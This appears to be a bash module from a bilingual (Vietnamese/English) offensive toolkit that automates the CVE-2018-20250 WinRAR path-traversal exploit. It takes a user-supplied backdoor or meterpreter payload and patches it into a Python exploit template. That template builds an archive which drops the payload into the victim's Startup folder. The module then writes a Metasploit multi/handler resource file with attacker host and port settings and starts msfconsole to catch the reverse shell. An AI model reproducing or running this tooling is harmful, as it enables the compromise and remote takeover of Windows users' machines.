function module_info {
if [ "$language" = "VN" ]; then
cat << !

        Tên: CVE-2018-20250 | Lỗ hổng thực thi mã từ xa WinRAR
     Mô-đun: exploit/windows/fileformat/CVE-2018-20250_winrar_rce
   Nền tảng: Windows
  Kiến trúc: x86, x64
  Quyền hạn: Không
    Công bố: 05/02/2019

Cung cấp bởi:
  @WyAtu

Mục tiêu khả dụng:
   Id  Tên
   --  ----
   0   RARLAB WinRAR phiên bản <= 5.61
!
module_compare
cat << !
Miêu tả:
   Trong các phiên bản WinRAR trước và bao gồm 5.61 có lỗ hổng truyền tải đường dẫn khi
   tạo trường tên tệp theo định dạng ACE (trong UNACEV2.dll). Khi trường tên tệp được
   thao tác với các mẫu cụ thể, thư mục đích (trích xuất) sẽ bị bỏ qua, do đó coi tên tệp
   là một đường dẫn tuyệt đối. Mô-đun này sẽ cố gắng trích xuất một tải trọng vào thư mục
   khởi động của hệ thống, vì vậy cần phải khởi động lại hệ thống thì mới có thể chạy tải trọng.

Tham khảo:
   https://www.cvedetails.com/cve/CVE-2018-20250/
   https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20250
   https://nvd.nist.gov/vuln/detail/CVE-2018-20250
   https://www.exploit-db.com/exploits/46552
   https://github.com/manulqwerty/Evil-WinRAR-Gen
   https://github.com/WyAtu/CVE-2018-20250

!
elif [ "$language" = "EN" ]; then
cat << !

       Name: CVE-2018-20250 | WinRAR Remote Code Execution Vulnerability
     Module: exploit/windows/fileformat/CVE-2018-20250_winrar_rce
   Platform: Windows
       Arch: x86, x64
 Privileged: No
  Disclosed: 05/02/2019

Provided by:
  @WyAtu

Available targets:
   Id  Name
   --  ----
   0   RARLAB WinRAR version <= 5.61
!
module_compare
cat << !
Description:
   In WinRAR versions prior to and including 5.61, there is path traversal vulnerability
   when crafting the filename field of the ACE format (in UNACEV2.dll). When the filename
   field is manipulated with specific patterns, the destination (extraction) folder is ignored,
   thus treating the filename as an absolute path.This module will attempt to extract a payload
   to the startup folder of the current user,therefore it is necessary to reboot the system
   to be able to run the payload.

References:
   https://www.cvedetails.com/cve/CVE-2018-20250/
   https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20250
   https://nvd.nist.gov/vuln/detail/CVE-2018-20250
   https://www.exploit-db.com/exploits/46552
   https://github.com/manulqwerty/Evil-WinRAR-Gen
   https://github.com/WyAtu/CVE-2018-20250

!
fi

}
############ Hàm gán giá trị các biến #####################
function defaul_module_options {
	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'` > /dev/null 2>&1
	lport="4444"
	file_name="CVE-2018-20250.rar"
	type_file="RAR"
	backdoor_file=""
	file_list=""
	attack_type="Lan"
	publichost=`dig +short myip.opendns.com @resolver1.opendns.com`
	publicport=`echo $lport`
	file_list_lenght=18
	backdoor_file_lenght=18
	publichost_lenght=18
}
############# Hàm kiểm tra chọn lựa để in ra màng hình ###############
function module_compare {
i_characters="i"
g_characters="g"	
_characters1="-"
_characters2="-"
if [[ $file_list_lenght -le 18 ]]; then
	file_list_lenght=18
fi
if [[ $publichost_lenght -le 18 ]]; then
	publichost_lenght=18
fi
if [[ $backdoor_file_lenght -le 18 ]]; then
	backdoor_file_lenght=18
fi
plus_strings=`expr $backdoor_file_lenght + $file_list_lenght + $publichost_lenght`
if  [[ "$plus_strings" -le 54 ]]; then
		module1
else
		module2
fi
}
############### Hàm nhận giá trị nhận vào của biến ###################
function set_module {
		if [[ "$new_processing_variables" = "file_name" ]] || [[ "$new_processing_variables" = "FILE_NAME" ]] || [[ "$new_processing_variables" = "File_name" ]]; then
			############# xóa biến và gán lại biến ################
			unset file_name
			file_name=$module_set
			################# nhận dạng đuôi file ra ###################
			type_file=`echo $file_name | cut -d'.' -f2 | sed 's/./\U&/g'` > /dev/null 2>&1
		elif [[ "$new_processing_variables" = "backdoor_file" ]] || [[ "$new_processing_variables" = "BACKDOOR_FILE" ]] || [[ "$new_processing_variables" = "Backdoor_file" ]]; then
			unset backdoor_file
			backdoor_file=`echo "$module_set" | cut -d "'" -f2` > /dev/null 2>&1
			################ bỏ đi ký tự cuối ####################
			backdoor_name=${backdoor_file##*/}
			backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
			if [[ $backdoor_file_lenght -le 18 ]]; then
				backdoor_file_lenght=18
			fi
		elif [[ "$new_processing_variables" = "publichost" ]] || [[ "$new_processing_variables" = "PUBLICHOST" ]] || [[ "$new_processing_variables" = "Publichost" ]]; then
			unset publichost
			publichost="$module_set"
			publichost_lenght=`echo $publichost | awk '{print length}'`
			if [[ $publichost_lenght -le 18 ]]; then
				publichost_lenght=18
			fi
		elif [[ "$new_processing_variables" = "publicport" ]] || [[ "$new_processing_variables" = "PUBLICPORT" ]] || [[ "$new_processing_variables" = "Publicport" ]]; then
			unset publicport
			publicport="$module_set"
		elif [[ "$new_processing_variables" = "file_list" ]] || [[ "$new_processing_variables" = "FILE_LIST" ]] || [[ "$new_processing_variables" = "File_list" ]]; then
			unset file_list
			file_list=`echo "$module_set" | cut -d "'" -f2` > /dev/null 2>&1
			file_list_name=${file_list##*/}
			file_list_lenght=`echo $file_list | awk '{print length}'`
			if [[ $file_list_lenght -le 18 ]]; then
				file_list_lenght=18
			fi
		elif [[ "$new_processing_variables" = "attack_type" ]] || [[ "$new_processing_variables" = "ATTACK_TYPE" ]] || [[ "$new_processing_variables" = "Attack_type" ]]; then
			if [[ "$module_set" = "lan" ]] || [[ "$module_set" = "LAN" ]] || [[ "$module_set" = "Lan" ]]; then
				unset attack_type
				attack_type="$module_set"
			elif [[ "$module_set" = "wan" ]] || [[ "$module_set" = "WAN" ]] || [[ "$module_set" = "Wan" ]]; then
				unset attack_type
				attack_type="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		fi
}

##################### Hàm canh lề cho biến ###################
############# Khi các biến có độ dài nhỏ hơn 18 ###############
function module1 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset integer
		none=" "
		myvar=""
	}
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`
	integer=`expr 20 - $file_name_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	file_name=$file_name$myvar
unset_value

backdoor_file=`echo $backdoor_file`
backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`
	integer=`expr 20 - $backdoor_file_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	backdoor_file=$backdoor_file$myvar
unset_value
attack_type=`echo $attack_type`
attack_type_lenght=`echo $attack_type | awk '{print length}'`
	integer=`expr 20 - $attack_type_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	attack_type=$attack_type$myvar
unset_value
file_list=`echo $file_list`
file_list_lenght=`echo $file_list | awk '{print length}'`
	integer=`expr 20 - $file_list_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	file_list=$file_list$myvar
unset_value
publichost=`echo $publichost`
publichost_lenght=`echo $publichost | awk '{print length}'`
	integer=`expr 20 - $publichost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	publichost=$publichost$myvar
unset_value
publicport=`echo $publicport`
publicport_lenght=`echo $publicport | awk '{print length}'`
	integer=`expr 20 - $publicport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	publicport=$publicport$myvar
unset_value
module_banner_1
}
function module2 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset subtract_compare_value
		none=" "
		myvar=""
	}
publichost=`echo $publichost`
publichost_lenght=`echo $publichost | awk '{print length}'`
file_list=`echo $file_list`
file_list_lenght=`echo $file_list | awk '{print length}'`
backdoor_file=`echo $backdoor_file`
backdoor_file_lenght=`echo $backdoor_file | awk '{print length}'`

subtract_compare1=`expr $publichost_lenght - $backdoor_file_lenght`
subtract_compare2=`expr $file_list_lenght - $backdoor_file_lenght`
subtract_compare3=`expr $file_list_lenght - $publichost_lenght`

if [[ $subtract_compare1 -gt 0 ]]; then
	if [[ $subtract_compare3 -lt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $file_list_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_list=$file_list$myvar
	unset_value
	
		greater_value=$publichost_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_list=$file_list$myvar
	unset_value
		subtract_compare_value=`expr $file_list_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $file_list_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$file_list_lenght
	fi
elif [[ $subtract_compare2 -gt 0 ]]; then
	if [[ $subtract_compare3 -gt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_list=$file_list$myvar
	unset_value
		subtract_compare_value=`expr $file_list_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $file_list_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
	
		greater_value=$file_list_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $file_list_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_list=$file_list$myvar
	unset_value
		subtract_compare_value=`expr $publichost_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$publichost_lenght
	fi
else
	if [[ $subtract_compare2 -lt 0 ]]; then
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
		subtract_compare_value=`expr $backdoor_file_lenght - $file_list_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		file_list=$file_list$myvar
	unset_value
		subtract_compare_value=`expr $backdoor_file_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
	
		greater_value=$backdoor_file_lenght
	else 
		integer=3
		for (( i = 0 ; i < $integer; i++ )) do
			myvar=$myvar$none
		done
		file_list=$file_list$myvar
	unset_value
		subtract_compare_value=`expr $file_list_lenght - $publichost_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		publichost=$publichost$myvar
	unset_value
		subtract_compare_value=`expr $file_list_lenght - $backdoor_file_lenght + 3`		
		for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
		done
		backdoor_file=$backdoor_file$myvar
	unset_value
	
		greater_value=$file_list_lenght
	fi
fi
publicport=`echo $publicport`
publicport_lenght=`echo $publicport | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $publicport_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	publicport=$publicport$myvar
unset_value
attack_type=`echo $attack_type`
attack_type_lenght=`echo $attack_type | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $attack_type_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	attack_type=$attack_type$myvar
unset_value
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`
subtract_compare_value=`expr $greater_value - $file_name_lenght + 3`	
	for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	file_name=$file_name$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	i_characters=$i_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 17 + 4`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	g_characters=$g_characters$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 5`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters1=$_characters1$myvar
unset_value
subtract_compare_value=`expr $greater_value - 16 + 3`
for (( i = 0 ; i < $subtract_compare_value; i++ )) do
		myvar=$myvar$none
	done
	_characters2=$_characters2$myvar
unset_value

module_banner_2
}
function module_banner_1 {
if [ "$language" = "VN" ]; then
yes="  Có"
no="  Không"
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2018-20250_winrar_rce):

   Tên       	  Thiết lập hiện tại 	Yêu cầu   Miêu tả
   ----       	  ---------------- 	--------  -----------
   FILE_NAME      $file_name $no    Tên tệp đầu ra.
   BACKDOOR_FILE  $backdoor_file $yes       Đường dẫn đến tệp thực thi / shell meterpreter / tải trọng.
   FILE_LIST	  $file_list $no    Tệp text chứa tên các tệp cần chèn (Các tệp cần chèn phải nằm cùng thư mục với tệp text).
   ATTACK_TYPE    $attack_type $no    Kiểu tấn công (Lan/Wan).
!
elif [ "$language" = "EN" ]; then
yes="  yes"
no="  no "
cat << !

Module options (exploit/windows/fileformat/CVE-2018-20250_winrar_rce):

   Name           Current Setting 	Required  Description
   ----           --------------- 	--------  -----------
   FILE_NAME      $file_name $no      The output file name.
   BACKDOOR_FILE  $backdoor_file $yes      Path of an executable file / meterpreter shell / payload.
   FILE_LIST	  $file_list $no      The text file contains names of the files to insert (The files must be in the same directory as the text file).
   ATTACK_TYPE    $attack_type $no      Attack type (Lan/Wan).
!
fi
attack_value=`echo $attack_type`
if [ "$language" = "VN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes       Máy chủ lắng nghe trên WAN.
   PUBLICPORT     $publicport $yes       Cổng lắng nge trên WAN,cổng này phải trùng với cổng khởi tạo trên tải trọng.

!
	else echo ""
	fi
elif [ "$language" = "EN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes      The public host to listen on.
   PUBLICPORT     $publicport $yes      The public port to listen on,this port must match the port created on the payload.

!
	else echo ""
	fi
fi
		
}
function module_banner_2 {
if [ "$language" = "VN" ]; then
yes="  Có"
no="  Không"
cat << !

Các tùy chọn của mô-đun (exploit/windows/fileformat/CVE-2018-20250_office_rce):

   Tên       	  Thiết lập hiện tạ${i_characters}Yêu cầu   Miêu tả
   ----       	  ---------------${_characters1}--------  -----------
   FILE_NAME      $file_name $no    Tên tệp đầu ra.
   BACKDOOR_FILE  $backdoor_file $yes       Đường dẫn đến tệp thực thi / shell meterpreter / tải trọng.
   FILE_LIST	  $file_list $no    Tệp text chứa tên các tệp cần chèn (Các tệp cần chèn phải nằm cùng thư mục với tệp text).
   ATTACK_TYPE    $attack_type $no    Kiểu tấn công (Lan/Wan).
!
elif [ "$language" = "EN" ]; then
yes=" yes"
no=" no "
cat << !

Module options (exploit/windows/fileformat/CVE-2018-20250_office_rce):

   Name           Current Setting${g_characters}Required  Description
   ----           ---------------${_characters2}--------  -----------
   FILE_NAME      $file_name $no      The output file name.
   BACKDOOR_FILE  $backdoor_file $yes      Path of an executable file / meterpreter shell / payload.
   FILE_LIST	  $file_list $no      The text file contains names of the files to insert (The files must be in the same directory as the text file).
   ATTACK_TYPE    $attack_type $no      Attack type (Lan/Wan).
!
fi
attack_value=`echo $attack_type`
if [ "$language" = "VN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost $yes       Máy chủ lắng nghe trên WAN, mặc định là địa chỉ IP của router.
   PUBLICPORT     $publicport $yes       Cổng lắng nge trên WAN, cổng này phải trùng với cổng khởi tạo trên tải trọng.

!
	else echo ""
	fi
elif [ "$language" = "EN" ]; then
	if [[ "$attack_value" = "wan" ]] || [[ "$attack_value" = "WAN" ]] || [[ "$attack_value" = "Wan" ]]; then
cat << !
   PUBLICHOST     $publichost$yes      The public host to listen on, default is the IP public address.
   PUBLICPORT     $publicport$yes      The public port to listen on, this port must match the port created on the payload.

!
	else echo ""
	fi
fi
		
}
################# targets ###################
#############################################
function show_targets {
if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   RARLAB WinRAR phiên bản <= 5.61

!
elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   RARLAB WinRAR version <= 5.61

!
fi
}

function target {
if [ "$language" = "VN" ]; then
cat << !
Các mục tiêu có thể khai thác:
   Id  Tên
   --  ----
   0   RARLAB WinRAR phiên bản <= 5.61

!
elif [ "$language" = "EN" ]; then
cat << !
Exploit target:
   Id  Name
   --  ----
   0   RARLAB WinRAR version <= 5.61

!
fi
}
################# payload list ###################
#############################################
function payload_list {
path_present=`pwd`
payload_list_file="$path_present/Config/payloads"
cat $payload_data | grep -i "   generic/" > $payload_list_file
cat $payload_data | grep -i "   windows/" >> $payload_list_file
echo "" >> $payload_list_file
}
function output_massage {
	function unset_value {
			unset none
			unset myvar
			unset integer
			none=" "
			myvar=""
		}
none=" "
myvar=""
file_output="$output_file/$file_name"
file_output_lenght=`echo $file_output | awk '{print length}'`
	integer=`expr 70 - $file_output_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	file_output=$file_output$myvar
unset_value
file_name=`echo $file_name`
file_name_lenght=`echo $file_name | awk '{print length}'`
	integer=`expr 70 - $file_name_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	file_name=$file_name$myvar
unset_value
type_file_display=`echo $type_file`
type_file_display_lenght=`echo $type_file_display | awk '{print length}'`
	integer=`expr 70 - $type_file_display_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	type_file_display=$type_file_display$myvar
unset_value
echo -e "$orange"
if [ "$language" = "VN" ]; then
cat << !

  ,-----------------++------------------------------------------------------------------------.
  | Tên file        ||  $file_name|
  | Loại tệp        ||  $type_file_display|
  | Vị trí lưu file ||  $file_output|
  '-----------------++------------------------------------------------------------------------'


!
elif [ "$language" = "EN" ]; then
cat << !

  ,-----------------++------------------------------------------------------------------------.
  | File name       ||  $file_name|
  | File type       ||  $type_file_display|
  | File location   ||  $file_output|
  '-----------------++------------------------------------------------------------------------'


!
fi
echo -e "$RESET"
}
function out_value {
backdoor_file=`echo $backdoor_file`
file_name=`echo $file_name`
type_file=`echo $type_file`
attack_type=`echo $attack_type`
file_list=`echo $file_list`
publichost=`echo $publichost`
publicport=`echo $publicport`
paylo=`echo $paylo`
lhost=`echo $lhost`
lport=`echo $lport`
}
function module_run {
out_value
module_path_present=`pwd`
module_path_rc_file="$module_path_present/Config"
rc_file="$module_path_rc_file/file.rc"
rm -rf $rc_file > /dev/null 2>&1
touch $rc_file > /dev/null 2>&1
	echo "use multi/handler" >> $rc_file
}
function attack {
#####################
path_present=`pwd`
cd $path_present/../../output
output_file=`pwd`
###################
path_tool="$output_file/../Tools/Vulnerability-Exploit/CVE-2018-20250"
if [ "$file_list" != "" ]; then
path_file_list=${file_list%/*}
path_file_list=`echo $path_file_list`
fi
if [[ "$paylo" != "" ]]; then
	if [[ "$attack_type" = "wan" ]] || [[ "$attack_type" = "WAN" ]] || [[ "$attack_type" = "Wan" ]]; then
		echo "set ReverseListenerBindAddress $lhost" >> $rc_file
		echo "set LHOST $publichost" >> $rc_file
		echo "set LPORT $lport" >> $rc_file
	else
		echo "set LHOST $lhost" >> $rc_file
		echo "set LPORT $lport" >> $rc_file
	fi
	echo "exploit -j -z" >> $rc_file
	cp $backdoor_file $path_tool > /dev/null 2>&1
if [ "$file_list" != "" ]; then
	cp $path_file_list/* $path_tool/Files > /dev/null 2>&1
fi
	cd $path_tool
if [ "$file_list" = "" ]; then
	array='"Files/hello.txt"'
	echo "Hello World!" > Files/hello.txt
else
	rm -rf list_file > /dev/null 2>&1
	touch list_file > /dev/null 2>&1
	parameter=`cat $file_list` > /dev/null 2>&1
	num=`echo $parameter | wc -w`		
	for (( i = 1 ; i <= $num; i++ )) do
	a=`echo $parameter | cut -d ' ' -f$i`
	value="\"Files/$a\", "
	echo $value >> list_file
	done
	list_file_array=`cat list_file`
	array=${list_file_array%,*}
	array=`echo $array`
fi
	sed "s|name.rar|$file_name|" exp > CVE-2018-20250.py
	sed -i "s|shell.exe|$backdoor_name|" CVE-2018-20250.py
	sed -i "s|list_array|$array|" CVE-2018-20250.py
	chmod 755 CVE-2018-20250.py
	service postgresql start
	echo -e "${BlueF}[*]$RESET $generate_file $file_name"
	xterm -e python3 CVE-2018-20250.py
	check_file=`find -name $file_name`
	if [[ "$check_file" != "" ]]; then
	sleep 1
	echo -e "${BlueF}[*]$RESET $done1 $file_name"
	mv $path_tool/Files/$file_name $output_file
	output_massage
		cd ../../../Victim
		echo -e "${BlueF}[!]$RESET $msf_start ${red}Metasploit Framework${RESET}"
		msfconsole -q -r $rc_file
		rm $path_tool/CVE-2018-20250.py > /dev/null 2>&1
		rm $path_tool/list_file > /dev/null 2>&1
		rm $path_tool/$backdoor_name > /dev/null 2>&1
		rm $path_tool/Files/* > /dev/null 2>&1
		killall xterm > /dev/null 2>&1
		cd $path_present
	else
		rm $path_tool/CVE-2018-20250.py > /dev/null 2>&1
		rm $path_tool/list_file > /dev/null 2>&1
		rm $path_tool/$backdoor_name > /dev/null 2>&1
		rm $path_tool/Files/* > /dev/null 2>&1
		killall xterm > /dev/null 2>&1
		cd $path_present
		echo -e "${red}[-]$RESET $error_gen_file"
	fi
else
	cp $backdoor_file $path_tool > /dev/null 2>&1
if [ "$file_list" != "" ]; then
	cp $path_file_list/* $path_tool/Files > /dev/null 2>&1
fi
	cd $path_tool
if [ "$file_list" = "" ]; then
	array='"Files/hello.txt"'
	echo "Hello World!" > Files/hello.txt
else
rm -rf list_file > /dev/null 2>&1
touch list_file > /dev/null 2>&1
parameter=`cat $file_list` > /dev/null 2>&1
num=`echo $parameter | wc -w`		
for (( i = 1 ; i <= $num; i++ )) do
a=`echo $parameter | cut -d ' ' -f$i`
value="\"Files/$a\", "
echo $value >> list_file
done
list_file_array=`cat list_file`
array=${list_file_array%,*}
array=`echo $array`
fi
	sed "s|name.rar|$file_name|" exp > CVE-2018-20250.py
	sed -i "s|shell.exe|$backdoor_name|" CVE-2018-20250.py
	sed -i "s|list_array|$array|" CVE-2018-20250.py
	chmod 755 CVE-2018-20250.py
	echo -e "${BlueF}[*]$RESET $generate_file $file_name"
	xterm -e python3 CVE-2018-20250.py
	check_file=`find -name $file_name`
	if [[ "$check_file" != "" ]]; then
	sleep 1
	echo -e "${BlueF}[*]$RESET $done1 $file_name"
	mv $path_tool/Files/$file_name $output_file
	output_massage
		rm $path_tool/CVE-2018-20250.py > /dev/null 2>&1
		rm $path_tool/list_file > /dev/null 2>&1
		rm $path_tool/$backdoor_name > /dev/null 2>&1
		rm $path_tool/Files/* > /dev/null 2>&1
		killall xterm > /dev/null 2>&1
		cd $path_present
	else
		rm $path_tool/CVE-2018-20250.py > /dev/null 2>&1
		rm $path_tool/list_file > /dev/null 2>&1
		rm $path_tool/$backdoor_name > /dev/null 2>&1
		rm $path_tool/Files/* > /dev/null 2>&1
		killall xterm > /dev/null 2>&1
		cd $path_present
		echo -e "${red}[-]$RESET $error_gen_file"
	fi
fi
cd $path_present
}
